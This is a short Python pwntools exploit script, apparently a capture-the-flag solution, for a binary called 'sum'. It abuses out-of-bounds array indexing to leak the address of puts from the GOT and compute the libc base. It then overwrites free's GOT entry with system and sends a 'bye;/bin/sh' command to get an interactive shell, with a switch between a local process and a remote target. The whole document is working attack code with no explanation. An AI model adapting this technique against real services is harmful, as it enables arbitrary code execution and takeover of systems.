from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./sum")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./sum")
else:
	p = remote(ip,port)
	libc = ELF("./libc-2.27.so")
	elf = ELF("./sum")

def set(index,value):
	p.sendlineafter("bye\n\n> ","set {index} {value}".format(index=index,value=value))

def get(index):
	p.sendlineafter("bye\n\n> ","get {index}".format(index=index))

def sum():
	p.sendlineafter("bye\n\n> ","sum")

def bye():
	p.sendlineafter("bye\n\n> ","bye")

def setnumber(number):
	p.sendlineafter("> ",str(number))

def debugf():
	gdb.attach(p,"b *0x400A65")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
setnumber(-1)
puts_got = elf.got["puts"]
get(puts_got/8)
puts_addr = int(p.recvline().strip("\n"))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))

free_got = elf.got["free"]
set(free_got/8,libc.symbols["system"])
p.sendlineafter("bye\n\n> ","bye;/bin/sh\x00")
p.interactive()
